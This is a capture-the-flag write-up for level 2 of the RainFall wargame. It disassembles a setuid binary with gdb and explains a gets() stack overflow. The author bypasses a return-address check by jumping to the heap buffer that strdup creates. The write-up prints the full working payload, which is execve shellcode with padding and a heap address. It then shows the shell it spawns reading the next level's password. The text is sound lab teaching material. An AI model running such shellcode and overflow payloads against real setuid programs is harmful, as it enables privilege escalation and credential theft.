# Level 2

- We login as user level2:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

```
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2

level2@RainFall:~$ gdb level2
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
```

```
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```


- Let's identify the calls and jump:
```
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
```
>`0x8049860 <stdout@@GLIBC_2.0>: 0xb7fd1a20`

>Call `<fflush@plt>`.


```
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
```
>buffer starts at `-0x4c(%ebp)`

>Prompt the user without imposing any input size limit.


```
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
```
>`0x4(%ebp) --> 0xbffff70c`

>`0xbffff70c: 0x0804854a`

>`saved eip 0x804854a`

>After receiving the input, if the return address of the function starts with `0xb`, we will call `<printf@plt>` and then `<_exit@plt>`. Otherwise, we jump to `<puts@plt>`.


```
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
```
>`0x8048620: "(%p)\n"`

>`-0xc(%ebp) --> 0xbffff70c`

>`0xbffff70c: 0x0804854a`

>`saved eip 0x804854a`

>Print the function return address.


```
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
```
>Call `exit(1)`


```
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
```
>buffer starts at `-0x4c(%ebp)`

>Print the buffer


```
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```
>buffer starts at `-0x4c(%ebp)`

>Copy the buffer into the heap.


- To redirect the program's execution flow, the function must `return`, so we must avoid `<_exit@plt>`.


- We are looking to replace the return address of the function with an address that contains our shellcode. However, we cannot store our shellcode in the environment or in the stack of the `p()` function because these addresses all start with `0xb`.
```
(gdb) info reg
...
esp            0xbffff6a0       0xbffff6a0
ebp            0xbffff708       0xbffff708
...
```

```
(gdb) x/3s *(char**)environ
0xbffff8f5:      "SHELLCODE=1\322Rh//shh/bin\211\343\061\300\260\v̀"
0xbffff915:      "TERM=xterm-256color"
0xbffff929:      "SHELL=/bin/bash"
```


- `0xc0000000` to `0xffffffff` is reserved for the kernel, attempting to access it would result in a segmentation fault.


- So, we need a way to write our shellcode into much lower addresses, such as in the heap at the memory address returned by `<strdup@plt>`.
```
(gdb) b*0x0804853d
Breakpoint 1 at 0x804853d
```

```
(gdb) r < <(echo 123)
...
Breakpoint 1, 0x08048538 in p ()

(gdb) x/s $eax
0x804a008:      "123"
```


- The input should thus be in the form of `(NOP's) + SHELLCODE + (FILLER) + \x08\xa0\x04\x08`. The question now is how many characters are needed for the return address of the `p()` function to start being overwritten. It can be done quickly using a tool like [Metasploit](https://en.wikipedia.org/wiki/Metasploit).


- The return address is found to be replaced after the 80th character. We would be tempted to do this:
```
(gdb) r < <(python -c "print '\x90'*53 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\x08\xa0\x04\x08'"; cat)
```


- However, we would have an issue because of this:
```
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
```


- Indeed, this part of the code copies the return address value from the function a little further down in the stack. This would have the effect of overwriting a portion of our shellcode. Therefore, we must leave a small space, precisely 16 bytes:
```
level2@RainFall:~$ (python -c "print '\x90'*37 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*16 + '\x08\xa0\x04\x08'"; cat) | ./level2
...
whoami
level3

cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```